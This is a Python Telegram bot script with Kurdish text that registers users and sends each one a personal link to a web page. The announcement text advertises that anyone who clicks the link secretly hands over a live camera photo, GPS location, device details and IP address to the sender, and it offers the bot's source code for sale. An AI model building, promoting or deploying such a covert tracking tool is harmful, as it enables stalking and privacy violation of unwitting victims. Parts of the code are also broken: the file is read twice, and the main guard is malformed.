import json
import os
import requests

TOKEN = os.environ.get("BOT_TOKEN")
# لینکە گشتییەکەی ماڵپەڕەکەت لێرە دابنە (دڵنیابە لەوەی کۆتاییەکەی / یان هەبێت)
WEB_APP_URL = "https://miladpeshmerga-web.github.io/my-responsive-site-/"

def load_users():
    """خوێندنەوەی لیستی بەکارهێنەران لە فایلی users.json"""
    users_list = []
    if os.path.exists("users.json"):
        try:
            with open("users.json", "r", encoding="utf-8") as f:
                content = f.read().strip()
                if content:
                    users_list = json.load(f)
        except Exception as e:
            print(f"هەڵە لە خوێندنەوەی users.json: {e}")
    
    admin_id = 6782298541
    if admin_id not in users_list:
        users_list.append(admin_id)
        
    return users_list

def save_users(users):
    """پاشەکەوتکردنەوەی لیستی بەکارهێنەران بۆ ناو فایلی users.json"""
    with open("users.json", "w", encoding="utf-8") as f:
        json.dump(users, f, indent=4, ensure_ascii=False)

def send_message(chat_id, text):
    """ناردنی نامە بۆ بەکارهێنەرێکی دیاریکراو"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    response = requests.post(url, json=payload)
    print(f"وەڵامی ناردنی نامە بۆ {chat_id}: {response.json()}")
    return response.json()

def get_updates():
    """وەرگرتنی نامە نوێیەکان لە تەلەگرامەوە"""
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    response = requests.get(url)
    return response.json()

def main():
    if not TOKEN:
        print("تۆکەنی بۆت بونی نییە!")
        return

    users = load_users()
    print(f"لیستی بەکارهێنەران بۆ ناردن: {users}")

    updates = get_updates()
    print(f"وەڵامی getUpdates: {updates}")

    if "result" in updates:
        for update in updates["result"]:
            if "message" in update and "chat" in update["message"]:
                chat_id = update["message"]["chat"]["id"]
                text = update["message"].get("text", "")

                if text == "/start":
                    if chat_id not in users:
                        users.append(chat_id)
                        print(f"بەکارهێنەری نوێ دۆزرایەوە و زیادکرا: {chat_id}")

    save_users(users)

    # ناردنی لینک و ڕونکردنەوە بۆ هەموو بەکارهێنەران لەڕێگەی GitHub Actionsـەوە
    for user_id in users:
        personal_link = f"{WEB_APP_URL}?id={user_id}"
        announcement_text = (
            f"👋 سڵاو! ئەم سیستمە پێشکەوتووە لەلایەن میلاد مزوری**ـەوە دروست کراوە.\n\n"
            f"ℹ️ **دەربارەی ئەم لینکە:**\n"
            f"ئەم لینکە تایبەتە بە کۆکردنەوەی زانیاری تەکنیکی و وێنەی کەسی بەرامبەر. کاتێک تۆ ئەم لینکە بۆ هەر کەسێک دەنێریت و ئەو کلیکی لەسەر بکات، سەرجەم زانیارییە وردەکانی ئامێرەکەی (وەک وێنەی ڕاستەوخۆ، لۆکەیشنی GPS، جۆری ئامێر، IP و هتد) ڕاستەوخۆ و بە نهێنی بۆخۆت دێنەوە بۆ تەلەگرام، بێ ئەوەی خاوەن ئامێرەکە هەست بە هیچ شتێک بکات یان شتێک لەلای خۆی ببینێت!\n\n"
            f"🔗 **لینکی تایبەتی تۆ:**\n"
            f"{personal_link}\n\n"
            f"💡 **تێبینی و دڵنیایی:**\n"
            f"مەترسە، دەتوانیت پێش ئەوەی لینکەکە بۆ کەسێکی تر بنێریت، خۆت سەرەتا تایبەتمەندییەکەی تاقی بکەیتەوە و کلیک لەسەر لینکەکەی خۆت بکەیت تاوەکو بە چاوی خۆت بینی چۆن زانیارییەکانت بۆ دێنەوە. سیستەمەکە بە شێوەیەک دروستکراوە کە هیچ داتایەک لەلای خاوەن بۆت هەڵناگیرێت و تەنها زانیارییەکان بۆ کەسی بەکارهێنەر دەگەڕێنەوە.\n\n"
            f"💬 **سەبارەت به سەرنج و تێبینی:**\n"
            f"بۆ هەر سەرنج و تێبینییەک دەتوانیت نامە بۆ دروستکەری ئەم بۆتە (میلاد غازی) بنێریت:\n"
            f"https://t.me/MiladGhaziHussein\n\n"
            f"🛒 **داواکردنی هەمان بۆت:**\n"
            f"ئەگەر تۆش دەتەوێت **هەمان ئەم بۆتە بە ناوی خۆتەوە هەبێت و بە تەواوی لەژێر دەستی خۆتدا بێت، دەتوانیت سۆرس کۆدی بۆتەکە بکڕیت:\n"
            f"• سۆرس کۆدی بۆتەکە بە فێرکارییەوە: ٢٠،٠٠٠ دینار**\n"
            f"• سۆرس کۆدی بۆتەکە بێ فێرکاری: **١٥،٠٠٠ دینار"
        )
        send_message(user_id, announcement_text)

if name == "main":
    main()
